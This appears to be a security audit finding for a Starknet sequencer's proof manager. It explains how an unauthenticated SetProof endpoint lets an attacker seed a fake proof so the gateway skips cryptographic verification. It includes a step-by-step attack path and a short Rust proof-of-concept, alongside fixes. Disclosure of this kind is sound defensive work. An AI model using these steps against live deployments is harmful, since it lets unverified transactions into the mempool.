### Title
Unauthenticated `SetProof` on `RemoteProofManagerServer` Allows Bypassing Cryptographic Proof Verification for Client-Side Proving Transactions - (File: `crates/apollo_proof_manager/src/communication.rs`)

---

### Summary

The `ProofManager` component exposes a `SetProof` endpoint via `RemoteComponentServer` bound to `0.0.0.0` in distributed deployments with no caller authentication. The `run_proof_verification` logic in `TransactionConverter` skips cryptographic proof verification when `contains_proof` returns `true`. An unprivileged network attacker can pre-populate the proof manager with a fake proof keyed to valid `proof_facts`, causing the gateway to accept a subsequent Invoke V3 transaction whose cryptographic proof is never verified.

---

### Finding Description

**Root cause — no access control on `SetProof`:**

`ProofManager::handle_request` dispatches `ProofManagerRequest::SetProof` directly to `self.set_proof(proof_facts, proof)` with no caller identity check:

```rust
// crates/apollo_proof_manager/src/communication.rs
ProofManagerRequest::SetProof(proof_facts, proof) => ProofManagerResponse::SetProof(
    self.set_proof(proof_facts, proof).await ...
),
```

`ProofManager::set_proof` stores any caller-supplied `(proof_facts, proof)` pair keyed by `proof_facts.hash()`:

```rust
// crates/apollo_proof_manager/src/proof_manager.rs
pub async fn set_proof(&self, proof_facts: ProofFacts, proof: Proof) -> ... {
    if self.contains_proof(proof_facts.clone()).await? { return Ok(()); }
    let facts_hash = proof_facts.hash();
    self.proof_storage.set_proof(facts_hash, proof.clone()).await?;
    self.cache.insert(facts_hash, proof);
    Ok(())
}
```

In the distributed deployment configuration the server is bound to `0.0.0.0`:

```json
// crates/apollo_deployments/resources/services/distributed/proof_manager.json
"components.proof_manager.execution_mode": "LocalExecutionWithRemoteEnabled",
"components.proof_manager.remote_server_config.bind_ip": "0.0.0.0",
```

**Verification skip — the `contains_proof` short-circuit:**

`run_proof_verification` in `TransactionConverter` checks `contains_proof` first. If the proof is already stored, it returns `Ok(false)` — skipping `starknet_proof_verifier::verify_proof` entirely:

```rust
// crates/apollo_transaction_converter/src/transaction_converter.rs
async fn run_proof_verification(...) -> Result<bool, TransactionConverterError> {
    let contains_proof = proof_manager_client.contains_proof(proof_facts.clone()).await?;
    if contains_proof {
        return Ok(false);   // ← verification skipped
    }
    tokio::task::spawn_blocking(move || {
        starknet_proof_verifier::verify_proof(proof_facts, proof)
    }).await...?;
    Ok(true)
}
```

**Attack path:**

1. Attacker constructs valid `proof_facts` (correct `program_hash` from `allowed_virtual_os_program_hashes`, a real `block_number` ≤ `current − STORED_BLOCK_HASH_BUFFER`, the matching stored `block_hash`, and the correct `config_hash`). All of these are public values.
2. Attacker pairs them with a garbage/fake `proof` (arbitrary bytes).
3. Attacker sends `ProofManagerRequest::SetProof(valid_proof_facts, fake_proof)` directly to the proof manager's remote endpoint — no authentication required.
4. Proof manager stores the fake proof keyed by `proof_facts.hash()`.
5. Attacker submits an Invoke V3 transaction carrying those same `proof_facts` and the fake `proof` to the gateway.
6. Gateway calls `run_proof_verification` → `contains_proof` returns `true` → cryptographic verification is skipped → `spawn_proof_verification` returns `Ok(())`.
7. `validate_proof_facts` in the blockifier passes (proof_facts reference a real block with a valid hash).
8. Transaction is accepted into the mempool with an unverified proof.

Note: the `proof` bytes are **not** part of the transaction hash (only `proof_facts` are hashed into the tx hash), so the transaction hash remains valid regardless of the fake proof content.

---

### Impact Explanation

The gateway accepts an Invoke V3 transaction whose client-side cryptographic proof was never verified. The "client-side proving" invariant — that the embedded `proof_facts` are backed by a valid SNOS proof — is broken. Any transaction with valid-looking `proof_facts` (referencing a real historical block) can be admitted without a real proof, as long as the attacker pre-seeds the proof manager.

This matches: **High. Mempool/gateway/RPC admission accepts invalid transactions or rejects valid transactions before sequencing.**

---

### Likelihood Explanation

In the distributed deployment the proof manager's `RemoteComponentServer` is bound to `0.0.0.0` with no authentication layer in the component infrastructure. Any host that can reach the proof manager's port can issue `SetProof` requests. The attacker only needs publicly available data (a historical block hash and the chain's config hash) to construct valid `proof_facts`. The fake proof can be any non-empty byte sequence.

---

### Recommendation

1. **Restrict `SetProof` to authenticated callers only.** Introduce a caller-identity check in `handle_request` for `SetProof` (and optionally `GetProof`/`ContainsProof`), analogous to the `PONG_HANDLER_CALLER` role in the remediated external bug. Only the gateway and consensus components should be permitted to call `SetProof`.

2. **Re-verify the proof on retrieval or at execution time.** `run_proof_verification` should not treat a stored proof as implicitly valid. Either re-verify on every call, or record a "verified" flag alongside the stored proof so that proofs written by unauthenticated callers are not treated as pre-verified.

3. **Bind the remote server to a non-public interface** (e.g., a cluster-internal address) and enforce network-level access controls as a defense-in-depth measure.

### Proof of Concept

```rust
// Attacker pre-seeds the proof manager with a fake proof for valid proof_facts.
// proof_facts reference a real block (block_number, block_hash, config_hash, program_hash
// are all public values).

let valid_proof_facts = ProofFacts::from(vec![
    PROOF_VERSION,
    VIRTUAL_SNOS,
    known_allowed_program_hash,
    VIRTUAL_OS_OUTPUT_VERSION,
    Felt::from(real_block_number),   // public
    real_block_hash,                  // public
    real_config_hash,                 // public
    Felt::ZERO,                       // l2_to_l1_messages_segment_size
]);

let fake_proof = Proof::from(vec![0xde, 0xad, 0xbe, 0xef]); // garbage bytes

// Direct call to the unauthenticated RemoteProofManagerServer endpoint:
proof_manager_client.set_proof(valid_proof_facts.clone(), fake_proof.clone()).await.unwrap();

// Now submit an Invoke V3 transaction with the same proof_facts + fake_proof.
// run_proof_verification will call contains_proof → true → skip verify_proof.
// validate_proof_facts (blockifier) passes because proof_facts reference a real block.
// Transaction is accepted by the gateway with an unverified proof.
let tx = invoke_tx_args! {
    proof_facts: valid_proof_facts,
    proof: fake_proof,
    ...
};
gateway.add_tx(tx, None).await; // succeeds
```
